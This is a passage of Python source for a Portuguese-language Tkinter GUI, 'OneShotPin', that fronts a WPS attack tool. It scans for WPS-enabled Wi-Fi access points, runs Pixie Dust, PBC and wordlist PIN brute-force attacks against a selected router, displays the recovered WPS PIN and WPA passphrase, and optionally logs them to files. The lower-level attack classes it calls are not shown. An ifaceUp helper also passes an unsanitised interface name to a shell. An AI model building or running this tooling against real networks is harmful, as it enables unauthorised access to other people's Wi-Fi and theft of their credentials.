        self.var_delay = tk.StringVar(value='0')
        self.var_save = tk.BooleanVar(value=False)
        self.var_pixie = tk.BooleanVar(value=True)
        self.var_bruteforce = tk.BooleanVar(value=False)
        self.var_pbc = tk.BooleanVar(value=False)
        self.var_verbose = tk.BooleanVar(value=False)
        self.var_pixie_force = tk.BooleanVar(value=False)
        self.var_show_cmd = tk.BooleanVar(value=False)
        self.var_loop = tk.BooleanVar(value=False)
        self.var_wordlist = tk.BooleanVar(value=False)

        # Fila para comunicação entre threads
        self.log_queue = queue.Queue()
        self.scan_queue = queue.Queue()
        self.result_queue = queue.Queue()

        self._build_ui()
        # Inicia o polling pela primeira vez
        self.root.after(100, self._poll_queues)

    def _build_ui(self):
        # Menu
        menubar = tk.Menu(self.root)
        file_menu = tk.Menu(menubar, tearoff=0)
        file_menu.add_command(label='Carregar Wordlist...', command=self._load_wordlist)
        file_menu.add_separator()
        file_menu.add_command(label='Salvar relatório...', command=self._save_report)
        file_menu.add_separator()
        file_menu.add_command(label='Sair', command=self._on_close)
        menubar.add_cascade(label='Arquivo', menu=file_menu)
        self.root.config(menu=menubar)

        # Frame principal
        main_frame = ttk.Frame(self.root, padding=10)
        main_frame.pack(fill=tk.BOTH, expand=True)

        # ===== TOPO: Interface e controles =====
        top_frame = ttk.LabelFrame(main_frame, text='Controle', padding=10)
        top_frame.pack(fill=tk.X, pady=(0, 5))

        # Linha 1: Interface e botões
        ttk.Label(top_frame, text='Interface:').grid(row=0, column=0, sticky=tk.W, padx=5)
        self.entry_iface = ttk.Entry(top_frame, textvariable=self.var_interface, width=15)
        self.entry_iface.grid(row=0, column=1, sticky=tk.W, padx=5)
        self.btn_scan = ttk.Button(top_frame, text='Escanear Redes', command=self._scan_networks)
        self.btn_scan.grid(row=0, column=2, padx=5)
        self.btn_stop = ttk.Button(top_frame, text='Parar', command=self._stop_attack, state=tk.DISABLED)
        self.btn_stop.grid(row=0, column=3, padx=5)

        # Linha 2: Modos de ataque
        ttk.Label(top_frame, text='Modo:').grid(row=1, column=0, sticky=tk.W, padx=5)
        mode_frame = ttk.Frame(top_frame)
        mode_frame.grid(row=1, column=1, columnspan=4, sticky=tk.W, padx=5)
        self.chk_pixie = ttk.Checkbutton(mode_frame, text='Pixie Dust', variable=self.var_pixie)
        self.chk_pixie.pack(side=tk.LEFT, padx=2)
        self.chk_brute = ttk.Checkbutton(mode_frame, text='Bruteforce', variable=self.var_bruteforce)
        self.chk_brute.pack(side=tk.LEFT, padx=2)
        self.chk_pbc = ttk.Checkbutton(mode_frame, text='PBC', variable=self.var_pbc)
        self.chk_pbc.pack(side=tk.LEFT, padx=2)
        self.chk_wordlist = ttk.Checkbutton(mode_frame, text='Wordlist', variable=self.var_wordlist)
        self.chk_wordlist.pack(side=tk.LEFT, padx=2)

        # Linha 3: PIN, botão wordlist e opções
        ttk.Label(top_frame, text='PIN:').grid(row=2, column=0, sticky=tk.W, padx=5)
        self.entry_pin = ttk.Entry(top_frame, textvariable=self.var_pin, width=15)
        self.entry_pin.grid(row=2, column=1, sticky=tk.W, padx=5)
        
        # BOTÃO WORDLIST VISÍVEL
        self.btn_wl = ttk.Button(top_frame, text='Selecionar Wordlist', command=self._load_wordlist)
        self.btn_wl.grid(row=2, column=2, padx=5)
        
        self.chk_save = ttk.Checkbutton(top_frame, text='Salvar credenciais', variable=self.var_save)
        self.chk_save.grid(row=2, column=3, padx=5)
        ttk.Label(top_frame, text='Delay (s):').grid(row=2, column=4, sticky=tk.W, padx=5)
        self.entry_delay = ttk.Entry(top_frame, textvariable=self.var_delay, width=6)
        self.entry_delay.grid(row=2, column=5, sticky=tk.W, padx=5)

        # Linha 4: Botão de ataque e opções avançadas
        self.btn_attack = ttk.Button(top_frame, text='Iniciar Ataque', command=self._start_attack)
        self.btn_attack.grid(row=3, column=0, columnspan=2, pady=5, sticky=tk.W, padx=5)

        adv_frame = ttk.Frame(top_frame)
        adv_frame.grid(row=3, column=2, columnspan=4, sticky=tk.W, padx=5)
        self.chk_verbose = ttk.Checkbutton(adv_frame, text='Verbose', variable=self.var_verbose)
        self.chk_verbose.pack(side=tk.LEFT, padx=2)
        self.chk_force = ttk.Checkbutton(adv_frame, text='Pixie Force', variable=self.var_pixie_force)
        self.chk_force.pack(side=tk.LEFT, padx=2)
        self.chk_showcmd = ttk.Checkbutton(adv_frame, text='Mostrar CMD', variable=self.var_show_cmd)
        self.chk_showcmd.pack(side=tk.LEFT, padx=2)
        self.chk_loop = ttk.Checkbutton(adv_frame, text='Loop', variable=self.var_loop)
        self.chk_loop.pack(side=tk.LEFT, padx=2)

        # ===== TABELA DE REDES =====
        table_frame = ttk.LabelFrame(main_frame, text='Redes WPS Detectadas', padding=5)
        table_frame.pack(fill=tk.BOTH, expand=True, pady=5)

        columns = ('bssid', 'essid', 'sec', 'pwr', 'device', 'model', 'locked')
        self.tree = ttk.Treeview(table_frame, columns=columns, show='headings',
                                  selectmode='browse', height=10)
        self.tree.heading('bssid', text='BSSID')
        self.tree.heading('essid', text='ESSID')
        self.tree.heading('sec', text='Segurança')
        self.tree.heading('pwr', text='Sinal')
        self.tree.heading('device', text='Dispositivo')
        self.tree.heading('model', text='Modelo')
        self.tree.heading('locked', text='Bloqueado')

        self.tree.column('bssid', width=140, minwidth=120)
        self.tree.column('essid', width=150, minwidth=100)
        self.tree.column('sec', width=80, minwidth=60)
        self.tree.column('pwr', width=50, minwidth=40)
        self.tree.column('device', width=150, minwidth=100)
        self.tree.column('model', width=120, minwidth=80)
        self.tree.column('locked', width=60, minwidth=40)

        scroll_tree = ttk.Scrollbar(table_frame, orient=tk.VERTICAL, command=self.tree.yview)
        self.tree.configure(yscrollcommand=scroll_tree.set)
        scroll_tree.pack(side=tk.RIGHT, fill=tk.Y)
        self.tree.pack(fill=tk.BOTH, expand=True)

        self.tree.bind('<<TreeviewSelect>>', self._on_select_network)
        self.tree.bind('<Double-1>', lambda e: self._start_attack())

        # ===== PAINEL DE RESULTADOS =====
        result_frame = ttk.LabelFrame(main_frame, text='Resultados', padding=5)
        result_frame.pack(fill=tk.X, pady=5)

        self.result_text = tk.Text(result_frame, height=3, font=('Courier', 10), state=tk.DISABLED)
        self.result_text.pack(fill=tk.X)

        # ===== LOG =====
        log_frame = ttk.LabelFrame(main_frame, text='Log', padding=5)
        log_frame.pack(fill=tk.BOTH, expand=True, pady=5)

        self.log_text = tk.Text(log_frame, height=10, font=('Courier', 9), state=tk.DISABLED,
                                wrap=tk.WORD, bg='#1e1e1e', fg='#d4d4d4')
        scroll_log = ttk.Scrollbar(log_frame, orient=tk.VERTICAL, command=self.log_text.yview)
        self.log_text.configure(yscrollcommand=scroll_log.set)
        scroll_log.pack(side=tk.RIGHT, fill=tk.Y)
        self.log_text.pack(fill=tk.BOTH, expand=True)

        self.log_text.tag_configure('info', foreground='#569cd6')
        self.log_text.tag_configure('success', foreground='#4ec9b0')
        self.log_text.tag_configure('error', foreground='#f44747')
        self.log_text.tag_configure('debug', foreground='#808080')

        self.status_bar = ttk.Label(self.root, text='Pronto', relief=tk.SUNKEN, anchor=tk.W)
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)

        self.log('OneShotPin GUI iniciado. Selecione uma interface e escaneie.', 'info')
        self.root.protocol('WM_DELETE_WINDOW', self._on_close)

    # ========== LOG ==========

    def log(self, msg, level='info'):
        self.log_queue.put((msg, level))

    def _process_log(self, msg, level):
        tag_map = {'i': 'info', 's': 'success', 'e': 'error', 'd': 'debug', 
                   'info': 'info', 'success': 'success', 'error': 'error', 'debug': 'debug'}
        tag = tag_map.get(level, 'info')
        try:
            self.log_text.config(state=tk.NORMAL)
            timestamp = datetime.now().strftime('%H:%M:%S')
            self.log_text.insert(tk.END, '[{}] {}\n'.format(timestamp, msg), tag)
            self.log_text.see(tk.END)
            self.log_text.config(state=tk.DISABLED)
            self.status_bar.config(text=msg[:80])
        except:
            pass

    # ========== WORDLIST ==========

    def _load_wordlist(self):
        fname = filedialog.askopenfilename(
            title='Selecionar wordlist de PINs',
            filetypes=[('Texto', '*.txt'), ('Todos', '*.*')]
        )
        if not fname:
            return
        try:
            with open(fname, 'r') as f:
                lines = f.read().splitlines()
            self.wordlist_pins = []
            for line in lines:
                pin = line.strip()
                if pin.isdigit() and len(pin) in (4, 8):
                    self.wordlist_pins.append(pin)
                elif pin.isdigit() and len(pin) == 7:
                    from_wps = WPSpin()
                    cs = from_wps.checksum(int(pin))
                    self.wordlist_pins.append(pin + str(cs))
            self.wordlist_index = 0
            self.var_wordlist.set(True)
            self.log('Wordlist carregada: {} PINs válidos de {}'.format(
                len(self.wordlist_pins), os.path.basename(fname)), 'success')
            if self.wordlist_pins:
                self.var_pin.set(self.wordlist_pins[0])
        except Exception as e:
            self.log('Erro ao carregar wordlist: {}'.format(str(e)), 'error')

    # ========== SCAN ==========

    def _scan_networks(self):
        iface = self.var_interface.get().strip()
        if not iface:
            messagebox.showerror('Erro', 'Informe o nome da interface')
            return

        self.btn_scan.config(state=tk.DISABLED, text='Escaneando...')
        self._clear_tree()
        self.networks_list = []

        self.scan_thread = threading.Thread(target=self._do_scan, args=(iface,), daemon=True)
        self.scan_thread.start()

    def _do_scan(self, iface):
        try:
            vuln_file = os.path.dirname(os.path.realpath(__file__)) + '/vulnwsc.txt'
            try:
                with open(vuln_file, 'r') as f:
                    vuln_list = f.read().splitlines()
            except:
                vuln_list = []

            scanner = WiFiScanner(iface, vuln_list, callback_log=lambda m, l: self.log(m, l))
            networks = scanner.iw_scanner()
            self.scan_queue.put(networks)
        except Exception as e:
            self.scan_queue.put(('error', str(e)))

    def _process_scan(self, data):
        if isinstance(data, tuple) and data[0] == 'error':
            self.log('Erro no scan: {}'.format(data[1]), 'error')
            self.btn_scan.config(state=tk.NORMAL, text='Escanear Redes')
            return

        networks = data
        if not networks:
            self.log('Nenhuma rede WPS encontrada.', 'error')
            self.btn_scan.config(state=tk.NORMAL, text='Escanear Redes')
            return

        self.networks_list = networks
        self._clear_tree()

        stored = []
        reports_file = self.reports_dir + 'stored.csv'
        try:
            with open(reports_file, 'r', newline='', encoding='utf-8', errors='replace') as f:
                reader = csv.reader(f, delimiter=';', quoting=csv.QUOTE_ALL)
                next(reader, None)
                stored = [(row[1], row[2]) for row in reader]
        except:
            pass

        for net in networks:
            essid = net.get('ESSID', 'HIDDEN') or 'HIDDEN'
            self.tree.insert('', tk.END,
                values=(
                    net['BSSID'],
                    essid,
                    net.get('Security type', '?'),
                    net.get('Level', 0),
                    net.get('Device name', ''),
                    '{} {}'.format(net.get('Model', ''), net.get('Model number', '')).strip(),
                    'Sim' if net['WPS locked'] else 'Não'
                )
            )

        self.log('{} redes WPS encontradas.'.format(len(networks)), 'success')
        self.btn_scan.config(state=tk.NORMAL, text='Escanear Redes')

    def _clear_tree(self):
        for item in self.tree.get_children():
            self.tree.delete(item)

    def _on_select_network(self, event):
        selection = self.tree.selection()
        if selection:
            item = self.tree.item(selection[0])
            self.selected_bssid = item['values'][0]

    # ========== ATAQUE ==========

    def _start_attack(self):
        iface = self.var_interface.get().strip()
        if not iface:
            messagebox.showerror('Erro', 'Informe a interface')
            return

        if not self.selected_bssid:
            selection = self.tree.selection()
            if selection:
                item = self.tree.item(selection[0])
                self.selected_bssid = item['values'][0]
            else:
                messagebox.showerror('Erro', 'Selecione uma rede na tabela')
                return

        if self._running:
            messagebox.showwarning('Aviso', 'Ataque já em andamento')
            return

        self._running = True
        self.btn_attack.config(state=tk.DISABLED, text='Atacando...')
        self.btn_stop.config(state=tk.NORMAL)
        self.result_text.config(state=tk.NORMAL)
        self.result_text.delete(1.0, tk.END)
        self.result_text.config(state=tk.DISABLED)

        pin = self.var_pin.get().strip() or None
        delay = float(self.var_delay.get()) if self.var_delay.get() else 0
        pixie = self.var_pixie.get()
        brute = self.var_bruteforce.get()
        pbc = self.var_pbc.get()
        use_wordlist = self.var_wordlist.get()

        self.attack_thread = threading.Thread(
            target=self._do_attack,
            args=(iface, self.selected_bssid, pin, pixie, brute, pbc, delay, use_wordlist),
            daemon=True
        )
        self.attack_thread.start()

    def _do_attack(self, iface, bssid, pin, pixie, brute, pbc, delay, use_wordlist):
        try:
            if not ifaceUp(iface):
                self.log('Falha ao ativar interface {}'.format(iface), 'error')
                self.result_queue.put(('done', None))
                return

            self.log('Iniciando ataque contra {}'.format(bssid))

            self.companion = Companion(iface, callback_log=lambda m, l: self.log(m, l), bssid=bssid)

            # --- MODO WORDLIST ---
            if use_wordlist and self.wordlist_pins:
                self.log('Modo Wordlist: {} PINs para testar'.format(len(self.wordlist_pins)), 'info')
                for idx, wl_pin in enumerate(self.wordlist_pins):
                    if not self._running:
                        break
                    self.log('[{}/{}] Testando PIN: {}'.format(idx+1, len(self.wordlist_pins), wl_pin), 'info')
                    result = self.companion.single_connection(bssid, wl_pin, pixiemode=False)
                    if result:
                        self.result_queue.put(('success', result))
                        if self.var_save.get():
                            self._save_creds(result)
                        self.result_queue.put(('done', None))
                        return
                    if delay > 0:
                        time.sleep(delay)
                self.log('Wordlist esgotada - nenhum PIN funcionou.', 'error')
                self.result_queue.put(('done', None))
                return

            # --- MODO BRUTEFORCE ---
            if brute:
                self.log('Modo bruteforce não implementado na GUI. Usando Pixie Dust.', 'error')
                result = self.companion.single_connection(bssid, pin, pixiemode=True)

            # --- MODO PBC ---
            elif pbc:
                result = self.companion.single_connection(bssid, pbc_mode=True)

            # --- MODO PIXIE DUST / PIN ÚNICO ---
            else:
                if not pin:
                    suggested = self.companion.generate_pins_list(bssid)
                    if suggested:
                        pin = suggested[0]['pin']
                        self.log('Usando PIN provável: {} ({})'.format(pin, suggested[0]['name']))
                result = self.companion.single_connection(bssid, pin, pixiemode=pixie,
                                                          showpixiecmd=self.var_show_cmd.get(),
                                                          pixieforce=self.var_pixie_force.get())

            if result:
                self.result_queue.put(('success', result))
                if self.var_save.get():
                    self._save_creds(result)
            else:
                self.result_queue.put(('fail', None))

        except Exception as e:
            self.log('Erro no ataque: {}'.format(str(e)), 'error')
            self.result_queue.put(('done', None))
        finally:
            if self.companion:
                self.companion.cleanup()
                self.companion = None
            if not self.var_loop.get() or not self._running:
                self.result_queue.put(('done', None))

    def _process_result(self, result):
        status, data = result
        if status == 'success':
            pin = data.get('pin', '?')
            psk = data.get('psk', '?')
            essid = data.get('essid', '?')
            self.result_text.config(state=tk.NORMAL)
            self.result_text.delete(1.0, tk.END)
            self.result_text.insert(tk.END, 'WPS PIN: {}\nWPA PSK SENHA: {}\nESSID: {}'.format(pin, psk, essid))
            self.result_text.config(state=tk.DISABLED)
            self.log('Credenciais obtidas com sucesso!', 'success')
            self.log('PIN: {} | PSK SENHA: {} | SSID: {}'.format(pin, psk, essid), 'success')
        elif status == 'fail':
            self.log('Ataque falhou - PIN incorreto ou timeout', 'error')
        elif status == 'done':
            pass

        self._running = False
        self.btn_attack.config(state=tk.NORMAL, text='Iniciar Ataque')
        self.btn_stop.config(state=tk.DISABLED)

        if self.var_loop.get():
            self.log('Loop ativo - reinicie o scan manualmente', 'info')

    def _stop_attack(self):
        self._running = False
        if self.companion:
            self.companion.stop()
        self.log('Ataque interrompido pelo usuário', 'error')
        self.btn_attack.config(state=tk.NORMAL, text='Iniciar Ataque')
        self.btn_stop.config(state=tk.DISABLED)

    # ========== SALVAR ==========

    def _save_creds(self, data):
        try:
            if not os.path.exists(self.reports_dir):
                os.makedirs(self.reports_dir)
            filename = self.reports_dir + 'stored'
            dateStr = datetime.now().strftime('%d/%m/%Y %H:%M:%S')
            bssid = data.get('bssid', '?')
            essid = data.get('essid', '?')
            pin = data.get('pin', '?')
            psk = data.get('psk', '?')

            with open(filename + '.txt', 'a', encoding='utf-8') as f:
                f.write('{}\nBSSID: {}\nESSID: {}\nWPS PIN: {}\nWPA PSK SENHA: {}\n\n'.format(
                    dateStr, bssid, essid, pin, psk))

            writeHeader = not os.path.isfile(filename + '.csv')
            with open(filename + '.csv', 'a', newline='', encoding='utf-8') as f:
                writer = csv.writer(f, delimiter=';', quoting=csv.QUOTE_ALL)
                if writeHeader:
                    writer.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
                writer.writerow([dateStr, bssid, essid, pin, psk])

            self.log('Credenciais salvas em {}.txt/.csv'.format(filename), 'success')
        except Exception as e:
            self.log('Erro ao salvar: {}'.format(str(e)), 'error')

    def _save_report(self):
        content = self.result_text.get(1.0, tk.END).strip()
        if not content:
            messagebox.showinfo('Info', 'Nenhum resultado para salvar')
            return
        fname = filedialog.asksaveasfilename(
            defaultextension='.txt',
            filetypes=[('Texto', '*.txt'), ('CSV', '*.csv'), ('Todos', '*.*')]
        )
        if fname:
            with open(fname, 'w', encoding='utf-8') as f:
                f.write(content + '\n')
            self.log('Relatório salvo em {}'.format(fname), 'success')

    # ========== POLLING (CORRIGIDO) ==========

    def _poll_queues(self):
        try:
            while True:
                msg, level = self.log_queue.get_nowait()
                self._process_log(msg, level)
        except queue.Empty:
            pass

        try:
            data = self.scan_queue.get_nowait()
            self._process_scan(data)
        except queue.Empty:
            pass

        try:
            result = self.result_queue.get_nowait()
            self._process_result(result)
        except queue.Empty:
            pass

        # CORREÇÃO: usar self.root.after em vez de self.after
        self.root.after(100, self._poll_queues)

    # ========== FECHAMENTO ==========

    def _on_close(self):
        if self._running:
            if not messagebox.askyesno('Confirma', 'Ataque em andamento. Deseja realmente sair?'):
                return
            self._stop_attack()
        if self.companion:
            self.companion.cleanup()
        self.root.destroy()


# ============================================================
# UTILITÁRIOS
# ============================================================

def ifaceUp(iface, down=False):
    action = 'down' if down else 'up'
    cmd = 'ip link set {} {}'.format(iface, action)
    res = subprocess.run(cmd, shell=True, stdout=sys.stdout, stderr=sys.stdout)
    return res.returncode == 0


# ============================================================
# MAIN
# ============================================================

if __name__ == '__main__':
    if sys.hexversion < 0x03060F0:
        sys.stderr.write('Requer Python 3.6+\n')
        sys.exit(1)
    if os.getuid() != 0:
        sys.stderr.write('Execute como root\n')
        sys.exit(1)

    root = tk.Tk()
    app = OneShotGUI(root)
    root.mainloop()
